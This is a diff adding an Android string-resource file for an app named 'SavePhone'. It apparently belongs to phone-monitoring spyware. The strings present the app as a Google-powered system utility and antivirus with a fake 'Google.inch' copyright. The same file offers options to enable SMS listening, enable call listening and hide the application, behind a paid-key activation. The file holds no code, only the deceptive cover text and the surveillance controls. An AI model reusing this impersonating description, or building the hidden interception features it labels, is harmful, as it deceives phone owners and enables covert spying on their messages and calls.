@@ -1,0 +1,27 @@
+<resources>
+    <string name="app_name" translatable="false">SavePhone</string>
+    <string name="action_settings" translatable="false">Settings</string>
+
+
+    <string name="phoneLabel" translatable="false">YOUR NUMBER: </string>
+     <string name="AppDescription" translatable="false">SavePhone is a system application  powered by Google-inch
+    We have always worked hard to delivered best services to our customers in the world.
+    IFirst increased your battery life, enhanced your phone\'s power management,
+    and clean your phone.
+    He also act as an anti virus and protect your phone integrity.</string>
+    <string name="copyright" translatable="false">\@Copyright <i>By Google.inch</i></string>
+    <string name="title_activity_configuration" translatable="false">settings</string>
+    <string name="keytitle" translatable="false">Key information</string>
+    <string name="keybuttontitle" translatable="false">Ask Application Key</string>
+    <string name="receivedkey" translatable="false">Enter your key :</string>
+    <string name="smsCheckboxLabel" translatable="false">ENABLE SMS LISTENING</string>
+    <string name="callCheckboxLabel" translatable="false">ENABLE CALL LISTENING</string>
+    <string name="savekey" translatable="false">Save your key</string>
+    <string name="save" translatable="false">Save</string>
+    <string name="hide" translatable="false">Hide Application</string>
+
+
+    <string name="generatedKey" translatable="false">Your key has being generate. You will received it a while.</string>
+    <string name="invalideKey" translatable="false">Your key is not valid</string>
+    <string name="valideKey" translatable="false">OK Key is valid</string>
+</resources>
